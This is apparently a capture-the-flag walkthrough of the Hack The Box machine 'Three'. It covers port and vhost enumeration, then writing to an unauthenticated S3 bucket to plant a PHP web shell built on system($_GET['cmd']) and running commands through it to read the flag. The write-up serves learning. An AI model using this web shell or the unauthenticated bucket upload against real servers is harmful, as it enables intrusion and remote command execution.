# Three

## Enumeration

Start by enumerating open ports,

```sh
$ sudo nmap -sV 10.129.122.167
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-05 08:47 EDT
Nmap scan report for 10.129.122.167
Host is up (0.035s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.58 seconds
```

To learn more about the website, I can install the [Wappalyzer](https://www.wappalyzer.com/) browser [extension](https://www.wappalyzer.com/apps) and visit the site again.

I see that it is running Apache 2.4.29 on Ubuntu. Hack The Box also says that it should show that the site is running PHP, but I don't see that. Another way, in dev tools, I can see the headers `Server: Apache/2.4.9 (Ubuntu)` and I confirm that it is running PHP by going to http://10.129.122.167/index.php.

## VHOST Domain Enumeration

Looking at the contact page, the email for the band is `mail@thetoppers.htb`, but that domain is not resolving, so I add it to `/etc/hosts` and confirm the page still loads using that address. Next, I want to enumerate other sub-domains that the server might be hosting using an enumeration tool such as `gobuster`, `wfuzz` or `feroxbuster`.

```sh
$ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://thetoppers.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: 1 Status: 400 [Size: 306]
Found: 11192521404255 Status: 400 [Size: 306]
Found: 11192521403954 Status: 400 [Size: 306]
Found: gc._msdcs Status: 400 [Size: 306]
Found: 2 Status: 400 [Size: 306]
Found: 11285521401250 Status: 400 [Size: 306]
Found: 2012 Status: 400 [Size: 306]
Found: 11290521402560 Status: 400 [Size: 306]
Found: 123 Status: 400 [Size: 306]
Found: 2011 Status: 400 [Size: 306]
Found: 3 Status: 400 [Size: 306]
Found: 4 Status: 400 [Size: 306]
Found: 2013 Status: 400 [Size: 306]
Found: 2010 Status: 400 [Size: 306]
Found: 911 Status: 400 [Size: 306]
Found: 11 Status: 400 [Size: 306]
Found: 24 Status: 400 [Size: 306]
Found: 10 Status: 400 [Size: 306]
Found: 7 Status: 400 [Size: 306]
Found: 99 Status: 400 [Size: 306]
Found: 2009 Status: 400 [Size: 306]
Found: www.1 Status: 400 [Size: 306]
Found: 50 Status: 400 [Size: 306]
Found: 12 Status: 400 [Size: 306]
Found: 20 Status: 400 [Size: 306]
Found: 2008 Status: 400 [Size: 306]
Found: 25 Status: 400 [Size: 306]
Found: 15 Status: 400 [Size: 306]
Found: 5 Status: 400 [Size: 306]
Found: www.2 Status: 400 [Size: 306]
Found: 13 Status: 400 [Size: 306]
Found: 100 Status: 400 [Size: 306]
Found: 44 Status: 400 [Size: 306]
Found: 54 Status: 400 [Size: 306]
Found: 9 Status: 400 [Size: 306]
Found: 70 Status: 400 [Size: 306]
Found: 01 Status: 400 [Size: 306]
Found: 16 Status: 400 [Size: 306]
Found: 39 Status: 400 [Size: 306]
Found: 6 Status: 400 [Size: 306]
Found: www.123 Status: 400 [Size: 306]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

This is supposed to show that `s3.thetoppers.htb` is a vhost, but it doesn't? I add it to `hosts` and it does resolve though. 🙁

I've got an issue with this scenario. Normally, the S3 buckets will be hosted in AWS, not as a VHost on Apache, so enumerating the sub-domains with `gobuster` wouldn't work. I'll give it a pass however because many people use S3 static hosting as a CDN, so I may have found the domain in the original website. In fact, that was the first thing I did.

## Exploiting Misconfigured S3 Buckets

Knowning that they are using S3 buckets for hosting, I can use the `awscli` to try to connect to the buckets unauthenticated. The AWS CLI still needs to be configured to work,

```sh
$ aws configure
AWS Access Key ID [None]: hack
AWS Secret Access Key [None]: hack
Default region name [None]: hack
Default output format [None]: hack
```

I can now use the CLI to list files in the bucket,

```sh
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2024-07-05 08:43:14          0 .htaccess
2024-07-05 08:43:14      11952 index.php
```

We can read from the bucket, can we write to it and create a reverse shell? First the PHP file we will attempt to upload. I've broken this PHP code up because it triggers my anti-virus.

```php
<?php //Insert system call here ?>
```

The system call to insert is, `system($_GET["***"]);` replacing *** with `cmd`.

And attempt to upload it,

```sh
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

That worked, so let's try to exploit it by visiting, http://thetoppers.htb/shell.php?cmd=id

```txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It worked...

So I can get the flag (skipping the reverse shell in the walkthrough) with,

```sh
curl http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt
```
